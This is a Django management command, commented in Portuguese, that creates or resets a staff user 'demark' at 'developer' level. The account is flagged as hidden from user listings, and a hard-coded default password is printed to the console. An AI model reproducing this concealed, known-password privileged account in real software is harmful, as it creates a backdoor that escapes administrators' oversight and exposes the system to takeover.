"""
Management command para criar/recriar o usuário developer (demark).

Uso:
    python manage.py criar_developer
    python manage.py criar_developer --senha MinhaSenh@123
"""

from django.core.management.base import BaseCommand
from django.contrib.auth.models import User


class Command(BaseCommand):
    help = 'Cria ou recria o usuário developer (demark) com perfil oculto e nível developer.'

    def add_arguments(self, parser):
        parser.add_argument(
            '--senha',
            default='Developer@2024!',
            help='Senha do usuário developer (padrão: Developer@2024!)',
        )

    def handle(self, *args, **options):
        from cadastros.models_perfil import PerfilUsuario

        senha = options['senha']
        username = 'demark'

        user, created = User.objects.get_or_create(
            username=username,
            defaults={
                'first_name': 'Developer',
                'last_name':  'System',
                'email':      'dev@sistema.local',
                'is_staff':   True,
                'is_active':  True,
            }
        )
        user.set_password(senha)
        user.is_staff  = True
        user.is_active = True
        user.save()

        perfil, _ = PerfilUsuario.objects.get_or_create(user=user)
        perfil.nivel  = 'developer'
        perfil.oculto = True
        perfil.save()

        acao = 'criado' if created else 'atualizado'
        self.stdout.write(self.style.SUCCESS(
            f'✔ Usuário "{username}" {acao} com sucesso.\n'
            f'  Nível  : developer\n'
            f'  Senha  : {senha}\n'
            f'  Oculto : sim (invisível nas listagens)\n'
        ))
